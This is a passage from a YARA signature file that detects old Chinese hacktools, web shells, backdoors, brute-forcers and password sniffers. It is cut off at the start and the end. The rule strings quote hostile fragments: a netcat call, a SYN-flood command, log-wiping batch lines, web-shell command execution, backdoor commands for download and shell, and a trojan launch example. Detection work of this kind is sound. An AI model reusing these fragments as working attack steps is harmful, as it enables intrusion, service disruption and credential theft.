		hash = "ce8e3d95f89fb887d284015ff2953dbdb1f16776"
	strings:
		$s0 = "@sql.exe -f ip.txt -m syn -t 3306 -c 5000 -u http://60.15.124.106:63389/tasksvr." ascii
	condition:
		all of them
}

rule Hacktools_CN_445_cmd {
	meta:
		description = "Disclosed hacktool set - file cmd.bat"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "69b105a3aec3234819868c1a913772c40c6b727a"
	strings:
		$bat = "@echo off" fullword ascii
		$s0 = "cs.exe %1" fullword ascii
		$s2 = "nc %1 4444" fullword ascii
	condition:
		$bat at 0 and all of ($s*)
}

rule Hacktools_CN_GOGOGO_Bat {
	meta:
		description = "Disclosed hacktool set - file GOGOGO.bat"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "4bd4f5b070acf7fe70460d7eefb3623366074bbd"
	strings:
		$s0 = "for /f \"delims=\" %%x in (endend.txt) do call :lisoob %%x" fullword ascii
		$s1 = "http://www.tzddos.com/ -------------------------------------------->byebye.txt" fullword ascii
		$s2 = "ren %systemroot%\\system32\\drivers\\tcpip.sys tcpip.sys.bak" fullword ascii
		$s4 = "IF /I \"%wangle%\"==\"\" ( goto start ) else ( goto erromm )" fullword ascii
		$s5 = "copy *.tzddos scan.bat&del *.tzddos" fullword ascii
		$s6 = "del /f tcpip.sys" fullword ascii
		$s9 = "if /i \"%CB%\"==\"www.tzddos.com\" ( goto mmbat ) else ( goto wangle )" fullword ascii
		$s10 = "call scan.bat" fullword ascii
		$s12 = "IF /I \"%erromm%\"==\"\" ( goto start ) else ( goto zuihoujh )" fullword ascii
		$s13 = "IF /I \"%zuihoujh%\"==\"\" ( goto start ) else ( goto laji )" fullword ascii
		$s18 = "sc config LmHosts start= auto" fullword ascii
		$s19 = "copy tcpip.sys %systemroot%\\system32\\drivers\\tcpip.sys > nul" fullword ascii
		$s20 = "ren %systemroot%\\system32\\dllcache\\tcpip.sys tcpip.sys.bak" fullword ascii
	condition:
		3 of them
}

rule Hacktools_CN_Burst_pass {
	meta:
		description = "Disclosed hacktool set - file pass.txt"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "55a05cf93dbd274355d798534be471dff26803f9"
	strings:
		$s0 = "123456.com" fullword ascii
		$s1 = "123123.com" fullword ascii
		$s2 = "360.com" fullword ascii
		$s3 = "123.com" fullword ascii
		$s4 = "juso.com" fullword ascii
		$s5 = "sina.com" fullword ascii
		$s7 = "changeme" fullword ascii
		$s8 = "master" fullword ascii
		$s9 = "google.com" fullword ascii
		$s10 = "chinanet" fullword ascii
		$s12 = "lionking" fullword ascii
	condition:
		all of them
}

rule Hacktools_CN_JoHor_Posts_Killer {
	meta:
		description = "Disclosed hacktool set - file JoHor_Posts_Killer.exe"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "d157f9a76f9d72dba020887d7b861a05f2e56b6a"
	strings:
		$s0 = "Multithreading Posts_Send Killer" fullword ascii
		$s3 = "GET [Access Point] HTTP/1.1" fullword ascii
		$s6 = "The program's need files was not exist!" fullword ascii
		$s7 = "JoHor_Posts_Killer" fullword wide
		$s8 = "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" fullword ascii
		$s10 = "  ( /s ) :" fullword ascii
		$s11 = "forms.vbp" fullword ascii
		$s12 = "forms.vcp" fullword ascii
		$s13 = "Software\\FlySky\\E\\Install" fullword ascii
	condition:
		5 of them
}

rule Hacktools_CN_Panda_tesksd {
	meta:
		description = "Disclosed hacktool set - file tesksd.jpg"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "922147b3e1e6cf1f5dd5f64a4e34d28bdc9128cb"
	strings:
		$s0 = "name=\"Microsoft.Windows.Common-Controls\" " fullword ascii
		$s1 = "ExeMiniDownload.exe" fullword wide
		$s16 = "POST %Hs" fullword ascii
	condition:
		all of them
}

rule Hacktools_CN_Http {
	meta:
		description = "Disclosed hacktool set - file Http.exe"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "788bf0fdb2f15e0c628da7056b4e7b1a66340338"
	strings:
		$s0 = "RPCRT4.DLL" fullword ascii
		$s1 = "WNetAddConnection2A" fullword ascii
		$s2 = "NdrPointerBufferSize" fullword ascii
		$s3 = "_controlfp" fullword ascii
	condition:
		all of them and filesize < 10KB
}

rule Hacktools_CN_Burst_Start {
	meta:
		description = "Disclosed hacktool set - file Start.bat - DoS tool"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "75d194d53ccc37a68286d246f2a84af6b070e30c"
	strings:
		$s0 = "for /f \"eol= tokens=1,2 delims= \" %%i in (ip.txt) do (" fullword ascii
		$s1 = "Blast.bat /r 600" fullword ascii
		$s2 = "Blast.bat /l Blast.bat" fullword ascii
		$s3 = "Blast.bat /c 600" fullword ascii
		$s4 = "start Clear.bat" fullword ascii
		$s5 = "del Result.txt" fullword ascii
		$s6 = "s syn %%i %%j 3306 /save" fullword ascii
		$s7 = "start Thecard.bat" fullword ascii
		$s10 = "setlocal enabledelayedexpansion" fullword ascii
	condition:
		5 of them
}

rule Hacktools_CN_Panda_tasksvr {
	meta:
		description = "Disclosed hacktool set - file tasksvr.exe"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "a73fc74086c8bb583b1e3dcfd326e7a383007dc0"
	strings:
		$s2 = "Consys21.dll" fullword ascii
		$s4 = "360EntCall.exe" fullword wide
		$s15 = "Beijing1" fullword ascii
	condition:
		all of them
}
rule Hacktools_CN_Burst_Clear {
	meta:
		description = "Disclosed hacktool set - file Clear.bat"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "148c574a4e6e661aeadaf3a4c9eafa92a00b68e4"
	strings:
		$s0 = "del /f /s /q %systemdrive%\\*.log    " fullword ascii
		$s1 = "del /f /s /q %windir%\\*.bak    " fullword ascii
		$s4 = "del /f /s /q %systemdrive%\\*.chk    " fullword ascii
		$s5 = "del /f /s /q %systemdrive%\\*.tmp    " fullword ascii
		$s8 = "del /f /q %userprofile%\\COOKIES s\\*.*    " fullword ascii
		$s9 = "rd /s /q %windir%\\temp & md %windir%\\temp    " fullword ascii
		$s11 = "del /f /s /q %systemdrive%\\recycled\\*.*    " fullword ascii
		$s12 = "del /f /s /q \"%userprofile%\\Local Settings\\Temp\\*.*\"    " fullword ascii
		$s19 = "del /f /s /q \"%userprofile%\\Local Settings\\Temporary Internet Files\\*.*\"   " ascii
	condition:
		5 of them
}

rule Hacktools_CN_Burst_Thecard {
	meta:
		description = "Disclosed hacktool set - file Thecard.bat"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "50b01ea0bfa5ded855b19b024d39a3d632bacb4c"
	strings:
		$s0 = "tasklist |find \"Clear.bat\"||start Clear.bat" fullword ascii
		$s1 = "Http://www.coffeewl.com" fullword ascii
		$s2 = "ping -n 2 localhost 1>nul 2>nul" fullword ascii
		$s3 = "for /L %%a in (" fullword ascii
		$s4 = "MODE con: COLS=42 lines=5" fullword ascii
	condition:
		all of them
}

rule Hacktools_CN_Burst_Blast {
	meta:
		description = "Disclosed hacktool set - file Blast.bat"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "b07702a381fa2eaee40b96ae2443918209674051"
	strings:
		$s0 = "@sql.exe -f ip.txt -m syn -t 3306 -c 5000 -u http:" ascii
		$s1 = "@echo off" fullword ascii
	condition:
		all of them
}

rule VUBrute_VUBrute {
	meta:
		description = "PoS Scammer Toolbox - http://goo.gl/xiIphp - file VUBrute.exe"
		author = "Florian Roth"
		date = "22.11.14"
		score = 70
		hash = "166fa8c5a0ebb216c832ab61bf8872da556576a7"
	strings:
		$s0 = "Text Files (*.txt);;All Files (*)" fullword ascii
		$s1 = "http://ubrute.com" fullword ascii
		$s11 = "IP - %d; Password - %d; Combination - %d" fullword ascii
		$s14 = "error.txt" fullword ascii
	condition:
		all of them
}

rule DK_Brute {
	meta:
		description = "PoS Scammer Toolbox - http://goo.gl/xiIphp - file DK Brute.exe"
		author = "Florian Roth"
		date = "22.11.14"
		score = 70
		reference = "http://goo.gl/xiIphp"
		hash = "93b7c3a01c41baecfbe42461cb455265f33fbc3d"
	strings:
		$s6 = "get_CrackedCredentials" fullword ascii
		$s13 = "Same port used for two different protocols:" fullword wide
		$s18 = "coded by fLaSh" fullword ascii
		$s19 = "get_grbToolsScaningCracking" fullword ascii
	condition:
		all of them
}

rule VUBrute_config {
	meta:
		description = "PoS Scammer Toolbox - http://goo.gl/xiIphp - file config.ini"
		author = "Florian Roth"
		date = "22.11.14"
		score = 70
		reference = "http://goo.gl/xiIphp"
		hash = "b9f66b9265d2370dab887604921167c11f7d93e9"
	strings:
		$s2 = "Restore=1" fullword ascii
		$s6 = "Thread=" ascii
		$s7 = "Running=1" fullword ascii
		$s8 = "CheckCombination=" fullword ascii
		$s10 = "AutoSave=1.000000" fullword ascii
		$s12 = "TryConnect=" ascii
		$s13 = "Tray=" ascii
	condition:
		all of them
}

rule sig_238_hunt {
	meta:
		description = "Disclosed hacktool set (old stuff) - file hunt.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "f9f059380d95c7f8d26152b1cb361d93492077ca"
	strings:
		$s1 = "Programming by JD Glaser - All Rights Reserved" fullword ascii
		$s3 = "Usage - hunt \\\\servername" fullword ascii
		$s4 = ".share = %S - %S" fullword wide
		$s5 = "SMB share enumerator and admin finder " fullword ascii
		$s7 = "Hunt only runs on Windows NT..." fullword ascii
		$s8 = "User = %S" fullword ascii
		$s9 = "Admin is %s\\%s" fullword ascii
	condition:
		all of them
}

rule sig_238_listip {
	meta:
		description = "Disclosed hacktool set (old stuff) - file listip.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "f32a0c5bf787c10eb494eb3b83d0c7a035e7172b"
	strings:
		$s0 = "ERROR!!! Bad host lookup. Program Terminate." fullword ascii
		$s2 = "ERROR No.2!!! Program Terminate." fullword ascii
		$s4 = "Local Host Name: %s" fullword ascii
		$s5 = "Packed by exe32pack 1.38" fullword ascii
		$s7 = "Local Computer Name: %s" fullword ascii
		$s8 = "Local IP Adress: %s" fullword ascii
	condition:
		all of them
}

rule ArtTrayHookDll {
	meta:
		description = "Disclosed hacktool set (old stuff) - file ArtTrayHookDll.dll"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "4867214a3d96095d14aa8575f0adbb81a9381e6c"
	strings:
		$s0 = "ArtTrayHookDll.dll" fullword ascii
		$s7 = "?TerminateHook@@YAXXZ" fullword ascii
	condition:
		all of them
}

rule sig_238_eee {
	meta:
		description = "Disclosed hacktool set (old stuff) - file eee.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "236916ce2980c359ff1d5001af6dacb99227d9cb"
	strings:
		$s0 = "szj1230@yesky.com" fullword wide
		$s3 = "C:\\Program Files\\DevStudio\\VB\\VB5.OLB" fullword ascii
		$s4 = "MailTo:szj1230@yesky.com" fullword wide
		$s5 = "Command1_Click" fullword ascii
		$s7 = "software\\microsoft\\internet explorer\\typedurls" fullword wide
		$s11 = "vb5chs.dll" fullword ascii
		$s12 = "MSVBVM50.DLL" fullword ascii
	condition:
		all of them
}

rule aspbackdoor_asp4 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file asp4.txt"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "faf991664fd82a8755feb65334e5130f791baa8c"
	strings:
		$s0 = "system.dll" fullword ascii
		$s2 = "set sys=server.CreateObject (\"system.contral\") " fullword ascii
		$s3 = "Public Function reboot(atype As Variant)" fullword ascii
		$s4 = "t& = ExitWindowsEx(1, atype)" ascii
		$s5 = "atype=request(\"atype\") " fullword ascii
		$s7 = "AceiveX dll" fullword ascii
		$s8 = "Declare Function ExitWindowsEx Lib \"user32\" (ByVal uFlags As Long, ByVal " ascii
		$s10 = "sys.reboot(atype)" fullword ascii
	condition:
		all of them
}

rule aspfile1 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file aspfile1.asp"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "77b1e3a6e8f67bd6d16b7ace73dca383725ac0af"
	strings:
		$s0 = "' -- check for a command that we have posted -- '" fullword ascii
		$s1 = "szTempFile = \"C:\\\" & oFileSys.GetTempName( )" fullword ascii
		$s5 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\"><BODY>" fullword ascii
		$s6 = "<input type=text name=\".CMD\" size=45 value=\"<%= szCMD %>\">" fullword ascii
		$s8 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword ascii
		$s15 = "szCMD = Request.Form(\".CMD\")" fullword ascii
	condition:
		3 of them
}

rule EditServer_HackTool {
	meta:
		description = "Disclosed hacktool set (old stuff) - file EditServer.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "87b29c9121cac6ae780237f7e04ee3bc1a9777d3"
	strings:
		$s0 = "%s Server.exe" fullword ascii
		$s1 = "Service Port: %s" fullword ascii
		$s2 = "The Port Must Been >0 & <65535" fullword ascii
		$s8 = "3--Set Server Port" fullword ascii
		$s9 = "The Server Password Exceeds 32 Characters" fullword ascii
		$s13 = "Service Name: %s" fullword ascii
		$s14 = "Server Password: %s" fullword ascii
		$s17 = "Inject Process Name: %s" fullword ascii

		$x1 = "WinEggDrop Shell Congirator" fullword ascii
	condition:
		5 of ($s*) or $x1
}

rule sig_238_letmein {
	meta:
		description = "Disclosed hacktool set (old stuff) - file letmein.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "74d223a56f97b223a640e4139bb9b94d8faa895d"
	strings:
		$s1 = "Error get globalgroup memebers: NERR_InvalidComputer" fullword ascii
		$s6 = "Error get users from server!" fullword ascii
		$s7 = "get in nt by name and null" fullword ascii
		$s16 = "get something from nt, hold by killusa." fullword ascii
	condition:
		all of them
}

rule sig_238_token {
	meta:
		description = "Disclosed hacktool set (old stuff) - file token.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "c52bc6543d4281aa75a3e6e2da33cfb4b7c34b14"
	strings:
		$s0 = "Logon.exe" fullword ascii
		$s1 = "Domain And User:" fullword ascii
		$s2 = "PID=Get Addr$(): One" fullword ascii
		$s3 = "Process " fullword ascii
		$s4 = "psapi.dllK" fullword ascii
	condition:
		all of them
}

rule sig_238_TELNET {
	meta:
		description = "Disclosed hacktool set (old stuff) - file TELNET.EXE from Windows ME"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "50d02d77dc6cc4dc2674f90762a2622e861d79b1"
	strings:
		$s0 = "TELNET [host [port]]" fullword wide
		$s2 = "TELNET.EXE" fullword wide
		$s4 = "Microsoft(R) Windows(R) Millennium Operating System" fullword wide
		$s14 = "Software\\Microsoft\\Telnet" fullword wide
	condition:
		all of them
}

rule snifferport {
	meta:
		description = "Disclosed hacktool set (old stuff) - file snifferport.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "d14133b5eaced9b7039048d0767c544419473144"
	strings:
		$s0 = "iphlpapi.DLL" fullword ascii
		$s5 = "ystem\\CurrentCorolSet\\" fullword ascii
		$s11 = "Port.TX" fullword ascii
		$s12 = "32Next" fullword ascii
		$s13 = "V1.2 B" fullword ascii
	condition:
		all of them
}

rule sig_238_webget {
	meta:
		description = "Disclosed hacktool set (old stuff) - file webget.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "36b5a5dee093aa846f906bbecf872a4e66989e42"
	strings:
		$s0 = "Packed by exe32pack" ascii
		$s1 = "GET A HTTP/1.0" fullword ascii
		$s2 = " error " fullword ascii
		$s13 = "Downloa" ascii
	condition:
		all of them
}

rule XYZCmd_zip_Folder_XYZCmd {
	meta:
		description = "Disclosed hacktool set (old stuff) - file XYZCmd.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "bbea5a94950b0e8aab4a12ad80e09b630dd98115"
	strings:
		$s0 = "Executes Command Remotely" fullword wide
		$s2 = "XYZCmd.exe" fullword wide
		$s6 = "No Client Software" fullword wide
		$s19 = "XYZCmd V1.0 For NT S" fullword ascii
	condition:
		all of them
}

rule ASPack_Chinese {
	meta:
		description = "Disclosed hacktool set (old stuff) - file ASPack Chinese.ini"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "02a9394bc2ec385876c4b4f61d72471ac8251a8e"
	strings:
		$s0 = "= Click here if you want to get your registered copy of ASPack" fullword ascii
		$s1 = ";  For beginning of translate - copy english.ini into the yourlanguage.ini" fullword ascii
		$s2 = "E-Mail:                      shinlan@km169.net" fullword ascii
		$s8 = ";  Please, translate text only after simbol '='" fullword ascii
		$s19 = "= Compress with ASPack" fullword ascii
	condition:
		all of them
}

rule aspbackdoor_EDIR {
	meta:
		description = "Disclosed hacktool set (old stuff) - file EDIR.ASP"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "03367ad891b1580cfc864e8a03850368cbf3e0bb"
	strings:
		$s1 = "response.write \"<a href='index.asp'>" fullword ascii
		$s3 = "if Request.Cookies(\"password\")=\"" ascii
		$s6 = "whichdir=server.mappath(Request(\"path\"))" fullword ascii
		$s7 = "Set fs = CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
		$s19 = "whichdir=Request(\"path\")" fullword ascii
	condition:
		all of them
}

rule sig_238_filespy {
	meta:
		description = "Disclosed hacktool set (old stuff) - file filespy.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 50
		hash = "89d8490039778f8c5f07aa7fd476170293d24d26"
	strings:
		$s0 = "Hit [Enter] to begin command mode..." fullword ascii
		$s1 = "If you are in command mode," fullword ascii
		$s2 = "[/l] lists all the drives the monitor is currently attached to" fullword ascii
		$s9 = "FileSpy.exe" fullword wide
		$s12 = "ERROR starting FileSpy..." fullword ascii
		$s16 = "exe\\filespy.dbg" fullword ascii
		$s17 = "[/d <drive>] detaches monitor from <drive>" fullword ascii
		$s19 = "Should be logging to screen..." fullword ascii
		$s20 = "Filmon:  Unknown log record type" fullword ascii
	condition:
		7 of them
}

rule ByPassFireWall_zip_Folder_Ie {
	meta:
		description = "Disclosed hacktool set (old stuff) - file Ie.dll"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "d1b9058f16399e182c9b78314ad18b975d882131"
	strings:
		$s0 = "d:\\documents and settings\\loveengeng\\desktop\\source\\bypass\\lcc\\ie.dll" fullword ascii
		$s1 = "LOADER ERROR" fullword ascii
		$s5 = "The procedure entry point %s could not be located in the dynamic link library %s" fullword ascii
		$s7 = "The ordinal %u could not be located in the dynamic link library %s" fullword ascii
	condition:
		all of them
}

rule EditKeyLogReadMe {
	meta:
		description = "Disclosed hacktool set (old stuff) - file EditKeyLogReadMe.txt"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "dfa90540b0e58346f4b6ea12e30c1404e15fbe5a"
	strings:
		$s0 = "editKeyLog.exe KeyLog.exe," fullword ascii
		$s1 = "WinEggDrop.DLL" fullword ascii
		$s2 = "nc.exe" fullword ascii
		$s3 = "KeyLog.exe" fullword ascii
		$s4 = "EditKeyLog.exe" fullword ascii
		$s5 = "wineggdrop" fullword ascii
	condition:
		3 of them
}

rule PassSniffer_zip_Folder_readme {
	meta:
		description = "Disclosed hacktool set (old stuff) - file readme.txt"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "a52545ae62ddb0ea52905cbb61d895a51bfe9bcd"
	strings:
		$s0 = "PassSniffer.exe" fullword ascii
		$s1 = "POP3/FTP Sniffer" fullword ascii
		$s2 = "Password Sniffer V1.0" fullword ascii
	condition:
		1 of them
}

rule sig_238_gina {
	meta:
		description = "Disclosed hacktool set (old stuff) - file gina.reg"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "324acc52566baf4afdb0f3e4aaf76e42899e0cf6"
	strings:
		$s0 = "\"gina\"=\"gina.dll\"" fullword ascii
		$s1 = "REGEDIT4" fullword ascii
		$s2 = "[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon]" fullword ascii
	condition:
		all of them
}

rule splitjoin {
	meta:
		description = "Disclosed hacktool set (old stuff) - file splitjoin.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "e4a9ef5d417038c4c76b72b5a636769a98bd2f8c"
	strings:
		$s0 = "Not for distribution without the authors permission" fullword wide
		$s2 = "Utility to split and rejoin files.0" fullword wide
		$s5 = "Copyright (c) Angus Johnson 2001-2002" fullword wide
		$s19 = "SplitJoin" fullword wide
	condition:
		all of them
}

rule EditKeyLog {
	meta:
		description = "Disclosed hacktool set (old stuff) - file EditKeyLog.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "a450c31f13c23426b24624f53873e4fc3777dc6b"
	strings:
		$s1 = "Press Any Ke" fullword ascii
		$s2 = "Enter 1 O" fullword ascii
		$s3 = "Bon >0 & <65535L" fullword ascii
		$s4 = "--Choose " fullword ascii
	condition:
		all of them
}

rule PassSniffer {
	meta:
		description = "Disclosed hacktool set (old stuff) - file PassSniffer.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "dcce4c577728e8edf7ed38ac6ef6a1e68afb2c9f"
	strings:
		$s2 = "Sniff" fullword ascii
		$s3 = "GetLas" fullword ascii
		$s4 = "VersionExA" fullword ascii
		$s10 = " Only RuntUZ" fullword ascii
		$s12 = "emcpysetprintf\\" fullword ascii
		$s13 = "WSFtartup" fullword ascii
	condition:
		all of them
}

rule aspfile2 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file aspfile2.asp"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "14efbc6cb01b809ad75a535d32b9da4df517ff29"
	strings:
		$s0 = "response.write \"command completed success!\" " fullword ascii
		$s1 = "for each co in foditems " fullword ascii
		$s3 = "<input type=text name=text6 value=\"<%= szCMD6 %>\"><br> " fullword ascii
		$s19 = "<title>Hello! Welcome </title>" fullword ascii
	condition:
		all of them
}

rule UnPack_rar_Folder_InjectT {
	meta:
		description = "Disclosed hacktool set (old stuff) - file InjectT.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "80f39e77d4a34ecc6621ae0f4d5be7563ab27ea6"
	strings:
		$s0 = "%s -Install                          -->To Install The Service" fullword ascii
		$s1 = "Explorer.exe" fullword ascii
		$s2 = "%s -Start                            -->To Start The Service" fullword ascii
		$s3 = "%s -Stop                             -->To Stop The Service" fullword ascii
		$s4 = "The Port Is Out Of Range" fullword ascii
		$s7 = "Fail To Set The Port" fullword ascii
		$s11 = "\\psapi.dll" fullword ascii
		$s20 = "TInject.Dll" fullword ascii

		$x1 = "Software\\Microsoft\\Internet Explorer\\WinEggDropShell" fullword ascii
		$x2 = "injectt.exe" fullword ascii
	condition:
		( 1 of ($x*) ) and ( 3 of ($s*) )
}

rule Jc_WinEggDrop_Shell {
	meta:
		description = "Disclosed hacktool set (old stuff) - file Jc.WinEggDrop Shell.txt"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "820674b59f32f2cf72df50ba4411d7132d863ad2"
	strings:
		$s0 = "Sniffer.dll" fullword ascii
		$s4 = ":Execute net.exe user Administrator pass" fullword ascii
		$s5 = "Fport.exe or mport.exe " fullword ascii
		$s6 = ":Password Sniffering Is Running |Not Running " fullword ascii
		$s9 = ": The Terminal Service Port Has Been Set To NewPort" fullword ascii
		$s15 = ": Del www.exe                   " fullword ascii
		$s20 = ":Dir *.exe                    " fullword ascii
	condition:
		2 of them
}

rule aspbackdoor_asp1 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file asp1.txt"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "9ef9f34392a673c64525fcd56449a9fb1d1f3c50"
	strings:
		$s0 = "param = \"driver={Microsoft Access Driver (*.mdb)}\" " fullword ascii
		$s1 = "conn.Open param & \";dbq=\" & Server.MapPath(\"scjh.mdb\") " fullword ascii
		$s6 = "set rs=conn.execute (sql)%> " fullword ascii
		$s7 = "<%set Conn = Server.CreateObject(\"ADODB.Connection\") " fullword ascii
		$s10 = "<%dim ktdh,scph,scts,jhqtsj,yhxdsj,yxj,rwbh " fullword ascii
		$s15 = "sql=\"select * from scjh\" " fullword ascii
	condition:
		all of them
}

rule QQ_zip_Folder_QQ {
	meta:
		description = "Disclosed hacktool set (old stuff) - file QQ.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "9f8e3f40f1ac8c1fa15a6621b49413d815f46cfb"
	strings:
		$s0 = "EMAIL:haoq@neusoft.com" fullword wide
		$s1 = "EMAIL:haoq@neusoft.com" fullword wide
		$s4 = "QQ2000b.exe" fullword wide
		$s5 = "haoq@neusoft.com" fullword ascii
		$s9 = "QQ2000b.exe" fullword ascii
		$s10 = "\\qq2000b.exe" fullword ascii
		$s12 = "WINDSHELL STUDIO[WINDSHELL " fullword wide
		$s17 = "SOFTWARE\\HAOQIANG\\" fullword ascii
	condition:
		5 of them
}

rule UnPack_rar_Folder_TBack {
	meta:
		description = "Disclosed hacktool set (old stuff) - file TBack.DLL"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "30fc9b00c093cec54fcbd753f96d0ca9e1b2660f"
	strings:
		$s0 = "Redirect SPort RemoteHost RPort       -->Port Redirector" fullword ascii
		$s1 = "http://IP/a.exe a.exe                 -->Download A File" fullword ascii
		$s2 = "StopSniffer                           -->Stop Pass Sniffer" fullword ascii
		$s3 = "TerminalPort Port                     -->Set New Terminal Port" fullword ascii
		$s4 = "Example: Http://12.12.12.12/a.exe abc.exe" fullword ascii
		$s6 = "Create Password Sniffering Thread Successfully. Status:Logging" fullword ascii
		$s7 = "StartSniffer NIC                      -->Start Sniffer" fullword ascii
		$s8 = "Shell                                 -->Get A Shell" fullword ascii
		$s11 = "DeleteService ServiceName             -->Delete A Service" fullword ascii
		$s12 = "Disconnect ThreadNumber|All           -->Disconnect Others" fullword ascii
		$s13 = "Online                                -->List All Connected IP" fullword ascii
		$s15 = "Getting The UserName(%c%s%c)-->ID(0x%s) Successfully" fullword ascii
		$s16 = "Example: Set REG_SZ Test Trojan.exe" fullword ascii
		$s18 = "Execute Program                       -->Execute A Program" fullword ascii
		$s19 = "Reboot                                -->Reboot The System" fullword ascii
		$s20 = "Password Sniffering Is Not Running" fullword ascii
	condition:
		4 of them
}

rule sig_238_cmd_2 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file cmd.jsp"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "be4073188879dacc6665b6532b03db9f87cfc2bb"
	strings:
		$s0 = "Process child = Runtime.getRuntime().exec(" ascii
		$s1 = "InputStream in = child.getInputStream();" fullword ascii
		$s2 = "String cmd = request.getParameter(\"" ascii
		$s3 = "while ((c = in.read()) != -1) {" fullword ascii
		$s4 = "<%@ page import=\"java.io.*\" %>" fullword ascii
	condition:
		all of them
}

rule RangeScan {
	meta:
		description = "Disclosed hacktool set (old stuff) - file RangeScan.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "bace2c65ea67ac4725cb24aa9aee7c2bec6465d7"
	strings:
		$s0 = "RangeScan.EXE" fullword wide
		$s4 = "<br><p align=\"center\"><b>RangeScan " fullword ascii
		$s9 = "Produced by isn0" fullword ascii
		$s10 = "RangeScan" fullword wide
		$s20 = "%d-%d-%d %d:%d:%d" fullword ascii
	condition:
		3 of them
}

rule XYZCmd_zip_Folder_Readme {
	meta:
		description = "Disclosed hacktool set (old stuff) - file Readme.txt"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "967cb87090acd000d22e337b8ce4d9bdb7c17f70"
	strings:
		$s3 = "3.xyzcmd \\\\RemoteIP /user:Administrator /pwd:1234 /nowait trojan.exe" fullword ascii
		$s20 = "XYZCmd V1.0" fullword ascii
	condition:
		all of them
}

rule ByPassFireWall_zip_Folder_Inject {
	meta:
		description = "Disclosed hacktool set (old stuff) - file Inject.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "34f564301da528ce2b3e5907fd4b1acb7cb70728"
	strings:
		$s6 = "Fail To Inject" fullword ascii
		$s7 = "BtGRemote Pro; V1.5 B/{" fullword ascii
		$s11 = " Successfully" fullword ascii
	condition:
		all of them
}

rule sig_238_sqlcmd {
	meta:
		description = "Disclosed hacktool set (old stuff) - file sqlcmd.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 40
		hash = "b6e356ce6ca5b3c932fa6028d206b1085a2e1a9a"
	strings:
		$s0 = "Permission denial to EXEC command.:(" fullword ascii
		$s3 = "by Eyas<cooleyas@21cn.com>" fullword ascii
		$s4 = "Connect to %s MSSQL server success.Enjoy the shell.^_^" fullword ascii
		$s5 = "Usage: %s <host> <uid> <pwd>" fullword ascii
		$s6 = "SqlCmd2.exe Inside Edition." fullword ascii
		$s7 = "Http://www.patching.net  2000/12/14" fullword ascii
		$s11 = "Example: %s 192.168.0.1 sa \"\"" fullword ascii
	condition:
		4 of them
}

rule ASPack_ASPACK {
	meta:
		description = "Disclosed hacktool set (old stuff) - file ASPACK.EXE"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "c589e6fd48cfca99d6335e720f516e163f6f3f42"
	strings:
		$s0 = "ASPACK.EXE" fullword wide
		$s5 = "CLOSEDFOLDER" fullword wide
		$s10 = "ASPack compressor" fullword wide
	condition:
		all of them
}

rule sig_238_2323 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file 2323.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "21812186a9e92ee7ddc6e91e4ec42991f0143763"
	strings:
